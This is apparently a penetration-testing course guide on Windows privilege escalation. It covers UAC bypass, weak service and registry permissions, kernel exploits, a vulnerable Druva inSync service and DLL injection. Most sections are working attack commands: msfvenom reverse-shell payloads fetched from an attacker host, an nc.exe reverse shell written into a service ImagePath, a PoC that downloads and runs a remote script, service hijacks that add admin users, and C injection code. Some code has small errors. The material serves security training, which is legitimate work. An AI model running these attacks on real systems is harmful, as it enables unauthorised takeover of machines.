# Attacking the OS

In this section will cover:
- User Account Control (UAC)
- Weak Permissions
- Kernel Exploits
- Vulnerable Services
- DLL Injection

## User Account Control

User Account Control (UAC) is a feature that enables a consent prompt for elevated activities. Applications have different integrity levels, and a program with a high level can perform tasks that could potentially compromise the system. When UAC is enabled, applications and tasks always run under the security context of a non-administrator account unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.

There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:
| Group Policy Setting                                                                                   | Registry Key                   | Default Setting                                                   |
|--------------------------------------------------------------------------------------------------------|---------------------------------|-------------------------------------------------------------------|
| User Account Control: Admin Approval Mode for the built-in Administrator account                       | FilterAdministratorToken        | Disabled                                                          |
| User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop | EnableUIADesktopToggle          | Disabled                                                          |
| User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode       | ConsentPromptBehaviorAdmin      | Prompt for consent for non-Windows binaries                       |
| User Account Control: Behavior of the elevation prompt for standard users                              | ConsentPromptBehaviorUser       | Prompt for credentials on the secure desktop                      |
| User Account Control: Detect application installations and prompt for elevation                        | EnableInstallerDetection        | Enabled (default for home) Disabled (default for enterprise)      |
| User Account Control: Only elevate executables that are signed and validated                           | ValidateAdminCodeSignatures     | Disabled                                                          |
| User Account Control: Only elevate UIAccess applications that are installed in secure locations        | EnableSecureUIAPaths            | Enabled                                                           |
| User Account Control: Run all administrators in Admin Approval Mode                                    | EnableLUA                       | Enabled                                                           |
| User Account Control: Switch to the secure desktop when prompting for elevation                        | PromptOnSecureDesktop           | Enabled                                                           |
| User Account Control: Virtualize file and registry write failures to per-user locations                | EnableVirtualization            | Enabled                                                           |

UAC should be enabled, and although it may not stop an attacker from gaining privileges, it is an extra step that may slow this process down and force them to become noisier.

The default RID 500 administrator account always operates at the high mandatory level. With Admin Approval Mode (AAM) enabled, any new admin accounts we create will operate at the medium mandatory level by default and be assigned two separate access tokens upon logging in.

**Verify UAC is Enable**
````
> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
````
**Checking UAC Level**
````
> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
````
**The value of ConsentPromptBehaviorAdmin is 0x5, which means the highest UAC level of Always notify is enabled. There are fewer UAC bypasses at this highest level.**

**Checking Windows Version**
````
> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
````
The UACME project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it. Let's use technique number 54, which is stated to work from Windows 10 build 14393. This technique targets the 32-bit version of the auto-elevating binary SystemPropertiesAdvanced.exe. There are many trusted binaries that Windows will allow to auto-elevate without the need for a UAC consent prompt.
- https://github.com/hfiref0x/UACME
- https://egre55.github.io/system-properties-uac-bypass/

**Reviewing Path Variable**
````
# Reviewing Path Variable
> cmd /c echo %PATH%

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\<user>\AppData\Local\Microsoft\WindowsApps;
````
We can potentially bypass UAC in this by using DLL hijacking by placing a malicious srrstr.dll DLL to WindowsApps folder, which will be loaded in an elevated context.

**UAC Bypass**
````
# Generating Malicious srrstr.dll DLL
> $ msfvenom -p windows/shell_reverse_tcp LHOST=<Our_IP> LPORT=<Our_Port> -f dll > srrstr.dll

# Downloading DLL Target
>curl http://<Our_IP>:8080/srrstr.dll -O "C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

# Starting nc Listener on Attack Host
$ nc -lnvp <Our_Port>

# Execute SystemPropertiesAdvanced.exe
> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
````

## Weak Permissions

Permissions on Windows systems are complicated and challenging to get right. A slight modification in one place may introduce a flaw elsewhere. As penetration testers, we need to understand how permissions work in Windows and the various ways that misconfigurations can be leveraged to escalate privileges. The permissions-related flaws discussed in this section are relatively uncommon in software applications put out by large vendors (but are seen from time to time) but are common in third-party software from smaller vendors, open-source software, and custom applications. Services usually install with SYSTEM privileges, so leveraging a service permissions-related flaw can often lead to complete control over the target system. Regardless of the environment, we should always check for weak permissions and be able to do it both with the help of tools and manually in case we are in a situation where we don't have our tools readily available.

**Permissive File System ACLs**
````
# Running SharpUp
> .\SharpUp.exe audit
=== SharpUp: Running Privilege Escalation Checks ===
=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  
  <SNIP>

# Checking Permissions with icacls
> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
````
Using icacls we can verify the vulnerability and see that the EVERYONE and BUILTIN\Users groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.

This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with msfvenom. It can give us a reverse shell as SYSTEM, or add a local admin user and give us full administrative control over the machine.

**Exploitation**
````
# Replacing Service Binary
> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
> sc start SecurityService
````

**Weak Service Permissions**
````
# Reviewing SharpUp Again
> SharpUp.exe audit
=== SharpUp: Running Privilege Escalation Checks ===
=== Modifiable Services ===
 
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"

# Checking Permissions with AccessChk
> accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
````
The flags we use, in order, are -q (omit banner), -u (suppress errors), -v (verbose), -c (specify name of a Windows service), and -w (show only objects that have write access). Here we can see that all Authenticated Users have SERVICE_ALL_ACCESS rights over the service, which means full read/write control over it.

**Exploitation**
````
# Changing the Service Binary Path
> sc config WindscribeService binpath="cmd /c net localgroup administrators <user> /add"

# Stopping Service
> sc stop WindscribeService

# Starting the Service
> sc start WindscribeService
-----------------------------------------------------------------------------------------------
# Weak Service Permissions - Cleanup
> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"

# Starting the Service Again
> sc start WindScribeService
````

**Unquoted Service Path**

When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders. Take the example binary path below.
````
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
````
Windows will decide the execution method of a program based on its file extension, so it's not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:
- C:\Program
- C:\Program Files
- C:\Program Files (x86)\System
- C:\Program Files (x86)\System Explorer\service\SystemExplorerService64

Querying Service
````
> sc qc SystemExplorerHelpService
[SC] QueryServiceConfig SUCCESS
SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
````
If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, NT AUTHORITY\SYSTEM.
- C:\Program.exe\
- C:\Program Files (x86)\System.exe

**Searching for Unquoted Service Paths**
````
> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
````

**Permissive Registry ACLs**
````
# Checking for Weak Service ACLs in Registry
> accesschk.exe /accepteula "<user>" -kvuqsw hklm\System\CurrentControlSet\services

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS

<SNIP>

# Changing ImagePath with PowerShell
> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\<user>\Downloads\nc.exe -e cmd.exe <Our_IP> <Our_Port>"
````

**Modifiable Registry Autorun Binary**
````
# Check Startup Programs
> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
````
We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.


## Kernel Exploits

It's a big challenge to ensure that all user desktops and servers are updated, and 100% compliance for all computers with security patches is likely not an achievable goal. Assuming a computer has been targeted for installation of updates, for example, using SCCM (Microsoft System Center Configuration Manager) or WSUS (Windows Server Update Services), there are still many reasons they could fail to install.

**Notable Vulnerabilities**

MS08-067 - This was a remote code execution vulnerability in the "Server" service due to improper handling of RPC requests. This affected Windows Server 2000, 2003, and 2008 and Windows XP and Vista and allows an unauthenticated attacker to execute arbitrary code with SYSTEM privileges. 

MS17-010 - Also known as EternalBlue is a remote code execution vulnerability that was part of the FuzzBunch toolkit released in the Shadow Brokers leak. This exploit leverages a vulnerability in the SMB protocol because the SMBv1 protocol mishandles packets specially crafted by an attacker, leading to arbitrary code execution on the target host as the SYSTEM account.

ALPC Task Scheduler 0-Day - The ALPC endpoint method used by the Windows Task Scheduler service could be used to write arbitrary DACLs to .job files located in the C:\Windows\tasks directory. An attacker could leverage this to create a hard link to a file that the attacker controls. The exploit for this flaw used the SchRpcSetSecurity API function to call a print job using the XPS printer and hijack the DLL as NT AUTHORITY\SYSTEM via the Spooler service.

CVE-2021-36934 HiveNightmare, aka SeriousSam is a Windows 10 flaw that results in ANY user having rights to read the Windows registry and access sensitive information regardless of privilege level. Researchers quickly developed a PoC exploit to allow reading of the SAM, SYSTEM, and SECURITY registry hives and create copies of them to process offline later and extract password hashes (including local admin).

**CVE-2021-36934 HiveNightmare**
````
# Checking Permissions on the SAM File
> icacls c:\Windows\System32\config\SAM
C:\Windows\System32\config\SAM BUILTIN\Administrators:(I)(F)
                               NT AUTHORITY\SYSTEM:(I)(F)
                               BUILTIN\Users:(I)(RX)

# Performing Attack and Parsing Password Hashes
> .\HiveNightmare.exe
````

**Bypassing the execution policy**
````
> Set-ExecutionPolicy Bypass -Scope Process
````

**Enumerating Missing Patches**
````
# Examining Installed Updates
> systeminfo
> wmic qfe list brief
> Get-Hotfix
````

**CVE-2020-0668 Example**

Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability, which exploits an arbitrary file move vulnerability leveraging the Windows Service Tracing. Service Tracing allows users to troubleshoot issues with running services and modules by generating debug information. Its parameters are configurable using the Windows registry. Setting a custom MaxFileSize value that is smaller than the size of the file prompts the file to be renamed with a .OLD extension when the service is triggered. This move operation is performed by NT AUTHORITY\SYSTEM, and can be abused to move a file of our choosing with the help of mount points and symbolic links.
````
# Checking Current User Privileges
> whoami /priv

https://github.com/RedCursorSecurityConsulting/CVE-2020-0668

# Checking Permissions on Binary
> icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
BUILTIN\Users:(I)(RX)

# Generating Malicious Binary
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<Our_IP> LPORT=<Our_Port> -f exe > maintenanceservice.exe

# Downloading the Malicious Binary (Twice)
> wget http://<Our_IP>:8080/maintenanceservice.exe -O maintenanceservice.exe
> wget http://<Our_Port>:8080/maintenanceservice.exe -O maintenanceservice2.exe

# Running the Exploit
> CVE-2020-0668.exe C:\Users\<user>\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

# Checking Permissions of New File
> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
WINLPE-WS02\<user>:(F)

# Replacing File with Malicious Binary
> copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

# Starting the Service
> net start MozillaMaintenance
````

## Vulnerable Services

We may be able to escalate privileges on well-patched and well-configured systems if users are permitted to install software or vulnerable third-party applications/services are used throughout the organization. It is common to encounter a multitude of different applications and services on Windows workstations during our assessments. Let's look at an instance of a vulnerable service that we could come across in a real-world environment. Some services/applications may allow us to escalate to SYSTEM.

Enumerating Installed Programs
````
> wmic product get name
````
Example "Druva inSync". A quick Google search shows that version 6.6.3 is vulnerable to a command injection attack via an exposed RPC service.

Enumerating Local Ports
Let's do some further enumeration to confirm that the service is running as expected. A quick look with netstat shows a service running locally on port 6064.
````
> netstat -ano | findstr 6064
````
Enumerating Process ID
Next, let's map the process ID (PID) 3324 back to the running process.
````
> get-process -Id 3324

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    149      10     1512       6748              3324   0 inSyncCPHwnet64
````
Enumerating Running Service
At this point, we have enough information to determine that the Druva inSync application is indeed installed and running, but we can do one last check using the Get-Service cmdlet.
````
> get-service | ? {$_.DisplayName -like 'Druva*'}

Status   Name               DisplayName
------   ----               -----------
Running  inSyncCPHService   Druva inSync Client Service
````
**Druva inSync Windows Client Local Privilege Escalation Example**
````
# Druva inSync PowerShell PoC

$ErrorActionPreference = "Stop"
$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
````
Modifying PowerShell PoC
````
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<Our_IP>:8080/shell.ps1')"

Rename the file Invoke-PowershellTCP.ps1 to shell.ps1 and append "Invoke-PowerShellTcp -Reverse -IPAddress <Our_IP> -Port <Our_Port>"
````
Exploitation
````
# Starting a Python Web Server
$ python3 -m http.server 8080

# Modifying the PowerShell execution policy 
> Set-ExecutionPolicy Bypass -Scope Process

# Execute POC
> .\poc.ps1
````

## DLL Injection

DLL injection is a method that involves inserting a piece of code, structured as a Dynamic Link Library (DLL), into a running process. This technique allows the inserted code to run within the process's context, thereby influencing its behavior or accessing its resources.

DLL injection finds legitimate applications in various areas. For instance, software developers leverage this technology for hot patching, a method that enables the amendment or updating of code seamlessly, without the need to restart the ongoing process immediately.

**LoadLibrary**

LoadLibrary is a widely utilized method for DLL injection, employing the LoadLibrary API to load the DLL into the target process's address space.

The LoadLibrary API is a function provided by the Windows operating system that loads a Dynamic Link Library (DLL) into the current process’s memory and returns a handle that can be used to get the addresses of functions within the DLL.
````
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary to load a DLL into the current process
    HMODULE hModule = LoadLibrary("example.dll");
    if (hModule == NULL) {
        printf("Failed to load example.dll\n");
        return -1;
    }
    printf("Successfully loaded example.dll\n");

    return 0;
}
````
The first example shows how LoadLibrary can be used to load a DLL into the current process legitimately.
````
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456 // The ID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}
````
The second example illustrates the use of LoadLibrary for DLL injection. This process involves allocating memory within the target process for the DLL path and then initiating a remote thread that begins at LoadLibrary and directs towards the DLL path.

**Manual Mapping**

Manual Mapping is an incredibly complex and advanced method of DLL injection. It involves the manual loading of a DLL into a process's memory and resolves its imports and relocations. However, it avoids easy detection by not using the LoadLibrary function, whose usage is monitored by security and anti-cheat systems.

A simplified outline of the process can be represented as follows:
- Load the DLL as raw data into the injecting process.
- Map the DLL sections into the targeted process.
- Inject shellcode into the target process and execute it. This shellcode relocates the DLL, rectifies the imports, executes the Thread Local Storage (TLS) callbacks, and finally calls the DLL main.

**Reflective DLL Injection**

Reflective DLL injection is a technique that utilizes reflective programming to load a library from memory into a host process. The library itself is responsible for its loading process by implementing a minimal Portable Executable (PE) file loader. This allows it to decide how it will load and interact with the host, minimising interaction with the host system and process.

"The procedure of remotely injecting a library into a process is two-fold. First, the library you aim to inject must be written into the target process’s address space (hereafter referred to as the 'host process'). Second, the library must be loaded into the host process to meet the library's runtime expectations, such as resolving its imports or relocating it to an appropriate location in memory.

Assuming we have code execution in the host process and the library we aim to inject has been written into an arbitrary memory location in the host process, Reflective DLL Injection functions as follows.
- Execution control is transferred to the library's ReflectiveLoader function, an exported function found in the library's export table. This can happen either via CreateRemoteThread() or a minimal bootstrap shellcode.
- As the library's image currently resides in an arbitrary memory location, the ReflectiveLoader initially calculates its own image's current memory location to parse its own headers for later use.
- The ReflectiveLoader then parses the host process's kernel32.dll export table to calculate the addresses of three functions needed by the loader, namely LoadLibraryA, GetProcAddress, and VirtualAlloc.
- The ReflectiveLoader now allocates a continuous memory region where it will proceed to load its own image. The location isn't crucial; the loader will correctly relocate the image later.
- The library's headers and sections are loaded into their new memory locations.
- The ReflectiveLoader then processes the newly loaded copy of its image's import table, loading any additional libraries and resolving their respective imported function addresses.
- The ReflectiveLoader then processes the newly loaded copy of its image's relocation table.
- The ReflectiveLoader then calls its newly loaded image's entry point function, DllMain, with DLL_PROCESS_ATTACH. The library has now been successfully loaded into memory.
- Finally, the ReflectiveLoader returns execution to the initial bootstrap shellcode that called it, or if it were called via CreateRemoteThread, the thread would terminate."

**DLL Hijacking**

DLL Hijacking is an exploitation technique where an attacker capitalizes on the Windows DLL loading process. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn't specify the full path to a required DLL, hence rendering it susceptible to such attacks.

The default DLL search order used by the system depends on whether Safe DLL Search Mode is activated. When enabled (which is the default setting), Safe DLL Search Mode repositions the user's current directory further down in the search order.

With this mode enabled, applications search for necessary DLL files in the following sequence:
- The directory from which the application is loaded.
- The system directory.
- The 16-bit system directory.
- The Windows directory.
- The current directory.
- The directories that are listed in the PATH environment variable.

However, if 'Safe DLL Search Mode' is deactivated, the search order changes to:
- The directory from which the application is loaded.
- The current directory.
- The system directory.
- The 16-bit system directory.
- The Windows directory
- The directories that are listed in the PATH environment variable

Disable Safe DLL Search Mode the setting by editing the registry.
````
1. Press Windows key + R to open the Run dialog box.
2. Type in Regedit and press Enter. This will open the Registry Editor.
3. Navigate to HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager.
4. In the right pane, look for the SafeDllSearchMode value. If it does not exist, right-click the blank space of the folder or right-click the Session Manager folder, select New and then DWORD (32-bit) Value. Name this new value as SafeDllSearchMode.
5. Double-click SafeDllSearchMode. In the Value data field, enter 1 to enable and 0 to disable Safe DLL Search Mode.
6. Click OK, close the Registry Editor and Reboot the system for the changes to take effect.
````
After identifying a DLL, the next step is determining which functions you want to modify, which necessitates reverse engineering tools, such as disassemblers and debuggers. Once the functions and their signatures have been identified, it's time to construct the DLL.
